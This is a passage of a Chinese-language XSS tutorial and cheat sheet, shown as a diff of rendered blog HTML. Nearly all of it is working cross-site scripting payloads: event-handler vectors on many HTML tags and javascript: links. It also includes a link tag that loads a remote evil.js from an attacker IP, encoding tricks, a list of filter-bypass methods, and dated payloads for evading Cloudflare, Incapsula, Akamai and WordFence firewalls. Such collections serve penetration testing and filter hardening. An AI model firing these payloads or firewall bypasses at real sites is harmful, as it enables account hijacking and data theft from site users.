+</span></span><span class="line"><span class="cl">&lt;<span class="nv">svgonload</span><span class="o">=</span>alert<span class="o">(</span>1<span class="o">)</span>&gt;
+</span></span><span class="line"><span class="cl">&lt;svg/onload<span class="o">=</span>alert<span class="o">(</span><span class="s1">&#39;XSS&#39;</span><span class="o">)</span>&gt;
+</span></span><span class="line"><span class="cl">&lt;svg <span class="nv">onload</span><span class="o">=</span>alert<span class="o">(</span>1<span class="o">)</span>//
+</span></span><span class="line"><span class="cl">&lt;svg/onload<span class="o">=</span>alert<span class="o">(</span>String.fromCharCode<span class="o">(</span>88,83,83<span class="o">))</span>&gt;
+</span></span><span class="line"><span class="cl">&lt;svg <span class="nv">id</span><span class="o">=</span>alert<span class="o">(</span>1<span class="o">)</span> <span class="nv">onload</span><span class="o">=</span>eval<span class="o">(</span>id<span class="o">)</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;&gt;&lt;svg/onload=alert(String.fromCharCode(88,83,83))&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;</span>&gt;&lt;svg/onload<span class="o">=</span>alert<span class="o">(</span>/XSS/<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#HTML5中的一些XSS</span>
+</span></span><span class="line"><span class="cl">&lt;body <span class="nv">onload</span><span class="o">=</span>alert<span class="o">(</span>/XSS/.source<span class="o">)</span>&gt;
+</span></span><span class="line"><span class="cl">&lt;input autofocus <span class="nv">onfocus</span><span class="o">=</span>alert<span class="o">(</span>1<span class="o">)</span>&gt;
+</span></span><span class="line"><span class="cl">&lt;<span class="k">select</span> autofocus <span class="nv">onfocus</span><span class="o">=</span>alert<span class="o">(</span>1<span class="o">)</span>&gt;
+</span></span><span class="line"><span class="cl">&lt;textarea autofocus <span class="nv">onfocus</span><span class="o">=</span>alert<span class="o">(</span>1<span class="o">)</span>&gt;
+</span></span><span class="line"><span class="cl">&lt;keygen autofocus <span class="nv">onfocus</span><span class="o">=</span>alert<span class="o">(</span>1<span class="o">)</span>&gt;
+</span></span><span class="line"><span class="cl">&lt;video/poster/onerror<span class="o">=</span>alert<span class="o">(</span>1<span class="o">)</span>&gt;
+</span></span><span class="line"><span class="cl">&lt;video&gt;&lt;<span class="nb">source</span> <span class="nv">onerror</span><span class="o">=</span><span class="s2">&#34;javascript:alert(1)&#34;</span>&gt;
+</span></span><span class="line"><span class="cl">&lt;video <span class="nv">src</span><span class="o">=</span>_ <span class="nv">onloadstart</span><span class="o">=</span><span class="s2">&#34;alert(1)&#34;</span>&gt;
+</span></span><span class="line"><span class="cl">&lt;details/open/ontoggle<span class="o">=</span><span class="s2">&#34;alert`1`&#34;</span>&gt;
+</span></span><span class="line"><span class="cl">&lt;audio src <span class="nv">onloadstart</span><span class="o">=</span>alert<span class="o">(</span>1<span class="o">)</span>&gt;
+</span></span><span class="line"><span class="cl">&lt;marquee <span class="nv">onstart</span><span class="o">=</span>alert<span class="o">(</span>1<span class="o">)</span>&gt;
+</span></span><span class="line"><span class="cl">&lt;meter <span class="nv">value</span><span class="o">=</span><span class="m">2</span> <span class="nv">min</span><span class="o">=</span><span class="m">0</span> <span class="nv">max</span><span class="o">=</span><span class="m">10</span> <span class="nv">onmouseover</span><span class="o">=</span>alert<span class="o">(</span>1<span class="o">)</span>&gt;2 out of 10&lt;/meter&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;body <span class="nv">ontouchstart</span><span class="o">=</span>alert<span class="o">(</span>1<span class="o">)</span>&gt; // 当手指触摸屏幕时触发
+</span></span><span class="line"><span class="cl">&lt;body <span class="nv">ontouchend</span><span class="o">=</span>alert<span class="o">(</span>1<span class="o">)</span>&gt;   // 当手指从屏幕中移走时触发
+</span></span><span class="line"><span class="cl">&lt;body <span class="nv">ontouchmove</span><span class="o">=</span>alert<span class="o">(</span>1<span class="o">)</span>&gt;  // 当手指在屏幕中拖动时触发XSS使用Script标签（外部Payload）
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>scirpt标签用于定义客户端脚本，比如JavaScript</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;script&gt;alert(1);&lt;/script&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;script&gt;alert(&#34;xss&#34;);&lt;/script&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>img标签定义HTML页面中的图像</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;img src=1onerror=alert(1);&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;img src=1onerror=alert(&#34;xss&#34;);&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>input标签规定了用户可以在其中输入数据的输入字段</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;input onfocus=alert(1);&gt;
+</span></span><span class="line"><span class="cl"> onfocus=&#34;alert(1);&#34;autofocus&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>details标签通过提供用户开启关闭的交互式控件，规定了用户可见的或者隐藏的需求的补充细节。ontoggle事件规定了在用户打开或关闭<details>元素时触发：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;details ontoggle=alert(1);&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;details openontoggle=alert(1);&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>svg标签用来在HTML页面中直接嵌入SVG文件的代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;svg onload=alert(1);&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>select标签用来创建下拉列表</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;select onfocus=alert(1)&gt;&lt;/select&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;select onfocus=alert(1)autofocus&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>iframe标签创建包含另外一个文档的内联框架</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;iframe onload=alert(1);&gt;&lt;/iframe&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>video标签定义视频，比如电影片段或其他视频流。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;video&gt;&lt;source onerror=alert(1)&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>audio标签定义声音，比如音乐或其他音频流。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;audio src=xonerror=alert(1);&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>body标签定义文档的主体</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;body onload=alert(1);&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>onscroll事件在元素滚动条在滚动时触发。我们可以利用换行符以及autofocus，当用户滑动滚动条的时候自动触发，无需用户去点击触发：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;body
+</span></span><span class="line"><span class="cl">onscroll=alert(1);&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;inputautofocus&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>textarea标签定义一个多行的文本输入控件。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;textarea onfocus=alert(1);autofocus&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>marquee标签</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;marquee onstart=alert(1)&gt;&lt;/marquee&gt;//Chrome不行，火狐和IE都可以
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>isindex标签</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;isindex type=image src=1onerror=alert(1)&gt;//仅限于IE
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>利用link远程包含JavaScript文件</p>
+<link>标签定义文档与外部资源的关系。在无CSP的情况下才可以使用：
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;link rel=import href=&#34;http://47.xxx.xxx.72/evil.js&#34;&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>利用JavaScript伪协议</p>
+<p>javascript:这个特殊的协议类型声明了URL的主体是任意的javascript代码，它由javascript的解释器运行。当浏览器装载了这样的URL时，并不会转向某个URL，而是执行这个URL中包含的javascript代码，并把最后一条javascript语句的字符串值作为新文档的内容显示出来。</p>
+<p>a标签</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;a href=&#34;javascript:alert(1);&#34;&gt;xss&lt;/a&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>iframe标签</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;iframe src=javascript:alert(1);&gt;&lt;/iframe&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>img标签</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;img src=xonerror=alert(1)&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;img src=javascript:alert(1)&gt;//IE7以下
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>form标签</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;form action=&#34;Javascript:alert(1)&#34;&gt;&lt;input type=submit&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="常见编码">常见编码</h3>
+<p><strong>1.js编码</strong>
+js提供了四种字符编码的策略
+三位八进制数字，如果个数不够，在前面补0，例如&quot;e&quot;的编码为&quot;\145&quot;
+两位十六进制数字，如果个数不够，在前面补0，例如&quot;e&quot;的编码为&quot;\x65&quot;
+四位十六进制数字，如果个数不够，在前面补0，例如&quot;e&quot;的编码为&quot;\u0065&quot;
+对于一些控制字符，使用特殊的C类型的转义风格(例如\n和\r)</p>
+<p><strong>2.html实体编码</strong>
+命名实体：以&amp;开头，以分号结尾
+字符编码：十进制，十六进制ASCII码或者Unicode字符编码</p>
+<p><strong>2.url编码</strong></p>
+<p>使用XSS编码测试时需要考虑html渲染的顺序，针对多种编码的组合时，要选择合适的编码进行测试</p>
+<h3 id="常见bypass">常见bypass</h3>
+<blockquote>
+<p>可以参考法克论坛的pdf</p>
+</blockquote>
+<h4 id="过滤的绕过">过滤的绕过</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">大小写绕过</span>
+</span></span><span class="line"><span class="cl">	<span class="o">-</span> <span class="nx">绕过标签黑名单</span>
+</span></span><span class="line"><span class="cl">	<span class="o">-</span> <span class="nx">用代码评估绕过单词黑名单</span>
+</span></span><span class="line"><span class="cl">	<span class="o">-</span> <span class="nx">不完整的HTML标签绕过</span>
+</span></span><span class="line"><span class="cl">	<span class="o">-</span> <span class="nx">绕过字符串的引号</span>
+</span></span><span class="line"><span class="cl">	<span class="o">-</span> <span class="nx">绕过Script标签的引号</span>
+</span></span><span class="line"><span class="cl">	<span class="o">-</span> <span class="nx">在mousedown事件中绕过引号</span>
+</span></span><span class="line"><span class="cl">	<span class="o">-</span> <span class="nx">绕过点</span><span class="err">（</span><span class="p">.</span><span class="err">）</span><span class="nx">的限制</span>
+</span></span><span class="line"><span class="cl">	<span class="o">-</span> <span class="nx">绕过字符串的括号</span>
+</span></span><span class="line"><span class="cl">	<span class="o">-</span> <span class="nx">绕过括号和分号</span>
+</span></span><span class="line"><span class="cl">	<span class="o">-</span> <span class="nx">绕过</span> <span class="nx">onxxxx</span><span class="o">=</span> <span class="nx">黑名单</span>
+</span></span><span class="line"><span class="cl">	<span class="o">-</span> <span class="nx">绕过空格过滤</span>
+</span></span><span class="line"><span class="cl">	<span class="o">-</span> <span class="nx">Bypass</span> <span class="nx">email</span> <span class="nx">filter</span>
+</span></span><span class="line"><span class="cl">	<span class="o">-</span> <span class="nx">绕过文档黑名单</span>
+</span></span><span class="line"><span class="cl">	<span class="o">-</span> <span class="nx">在字符串中使用javascript绕过</span>
+</span></span><span class="line"><span class="cl">	<span class="o">-</span> <span class="nx">使用其他方式绕过重定向限制</span>
+</span></span><span class="line"><span class="cl">	<span class="o">-</span> <span class="nx">使用其他方式执行alert</span>
+</span></span><span class="line"><span class="cl">	<span class="o">-</span> <span class="nx">不使用任何东西绕过</span> <span class="s2">&#34;&gt;&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="o">-</span> <span class="nx">使用其他字符绕过</span> <span class="s2">&#34;;&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="o">-</span> <span class="nx">使用HTML编码绕过</span>
+</span></span><span class="line"><span class="cl">	<span class="o">-</span> <span class="nx">使用Katana绕过</span>
+</span></span><span class="line"><span class="cl">	<span class="o">-</span> <span class="nx">使用Lontara绕过</span>
+</span></span><span class="line"><span class="cl">	<span class="o">-</span> <span class="nx">使用ECMAScript6绕过</span>
+</span></span><span class="line"><span class="cl">	<span class="o">-</span> <span class="nx">使用八进制编码绕过</span>
+</span></span><span class="line"><span class="cl">	<span class="o">-</span> <span class="nx">使用Unicode编码绕过</span>
+</span></span><span class="line"><span class="cl">	<span class="o">-</span> <span class="nx">使用UTF</span><span class="o">-</span><span class="mi">7</span><span class="nx">编码绕过</span>
+</span></span><span class="line"><span class="cl">	<span class="o">-</span> <span class="nx">使用UTF</span><span class="o">-</span><span class="mi">8</span><span class="nx">编码绕过</span>
+</span></span><span class="line"><span class="cl">	<span class="o">-</span> <span class="nx">使用UTF</span><span class="o">-</span><span class="mi">16</span><span class="nx">be编码绕过</span>
+</span></span><span class="line"><span class="cl">	<span class="o">-</span> <span class="nx">使用UTF</span><span class="o">-</span><span class="mi">32</span><span class="nx">编码绕过</span>
+</span></span><span class="line"><span class="cl">	<span class="o">-</span> <span class="nx">使用BOM</span><span class="err">（</span><span class="nx">浏览器对象模型</span><span class="err">）</span><span class="nx">绕过</span>
+</span></span><span class="line"><span class="cl">	<span class="o">-</span> <span class="nx">使用奇怪的编码绕过</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="过狗">过狗</h4>
+<blockquote>
+<p>发现了个好资源，直接借鉴的，推荐去学学</p>
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+</blockquote>
+<p>Cloudflare XSS Bypasses</p>
+<p>25st January 2021</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;svg/onrandom=random onload=confirm(1)&gt;
+</span></span><span class="line"><span class="cl">&lt;video onnull=null onmouseover=confirm(1)&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>21st April 2020</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;svg/OnLoad=&#34;`${prompt``}`&#34;&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>22nd August 2019</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">svg</span><span class="o">/</span><span class="n">onload</span><span class="o">=%</span><span class="mi">26</span><span class="n">nbsp</span><span class="p">;</span><span class="n">alert</span><span class="o">`</span><span class="n">bohdan</span><span class="o">`+</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>5th June 2019</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39;&#34;&gt;&lt;img/src/onerror=.1|alert``&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>3rd June 2019</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;svg onload=prompt%26%230000000040document.domain)&gt;
+</span></span><span class="line"><span class="cl">&lt;svg onload=prompt%26%23x000000028;document.domain)&gt;
+</span></span><span class="line"><span class="cl">xss&#39;&#34;&gt;&lt;iframe srcdoc=&#39;%26lt;script&gt;;prompt`${document.domain}`%26lt;/script&gt;&#39;&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Cloudflare XSS Bypass - 22nd March 2019 (by @RakeshMane10)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;svg/onload=&amp;#97&amp;#108&amp;#101&amp;#114&amp;#00116&amp;#40&amp;#41&amp;#x2f&amp;#x2f
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Cloudflare XSS Bypass - 27th February 2018</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;a href=&#34;j&amp;Tab;a&amp;Tab;v&amp;Tab;asc&amp;NewLine;ri&amp;Tab;pt&amp;colon;&amp;lpar;a&amp;Tab;l&amp;Tab;e&amp;Tab;r&amp;Tab;t&amp;Tab;(document.domain)&amp;rpar;&#34;&gt;X&lt;/a&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Chrome Auditor - 9th August 2018</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;/script&gt;&lt;svg&gt;&lt;script&gt;alert(1)-%26apos%3B
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Live example by @brutelogic - <a href="https://brutelogic.com.br/xss.php?c1=alert%281%29-%26apos%3B"target="_blank" rel="external nofollow noopener noreferrer">https://brutelogic.com.br/xss.php<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+<p>Incapsula WAF Bypass by <a href="https://twitter.com/Alra3ees/status/971847839931338752"target="_blank" rel="external nofollow noopener noreferrer">@Alra3ees<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a>- 8th March 2018</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">anythinglr00&lt;/script&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;uxldz
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Incapsula WAF Bypass by <a href="https://twitter.com/c0d3G33k"target="_blank" rel="external nofollow noopener noreferrer">@c0d3G33k<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a> - 11th September 2018</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;object data=&#39;data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&#39;&gt;&lt;/object&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Incapsula WAF Bypass by <a href="https://twitter.com/daveysec/status/1126999990658670593"target="_blank" rel="external nofollow noopener noreferrer">@daveysec<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a> - 11th May 2019</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;svg onload\r\n=$.globalEval(&#34;al&#34;+&#34;ert()&#34;);&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Akamai WAF Bypass by <a href="https://twitter.com/zseano"target="_blank" rel="external nofollow noopener noreferrer">@zseano<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a> - 18th June 2018</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?&#34;&gt;&lt;/script&gt;&lt;base%20c%3D=href%3Dhttps:\mysite&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Akamai WAF Bypass by <a href="https://twitter.com/s0md3v/status/1056447131362324480"target="_blank" rel="external nofollow noopener noreferrer">@s0md3v<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a> - 28th October 2018</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>WordFence WAF Bypass by <a href="https://twitter.com/brutelogic"target="_blank" rel="external nofollow noopener noreferrer">@brutelogic<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a> - 12th September 2018</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
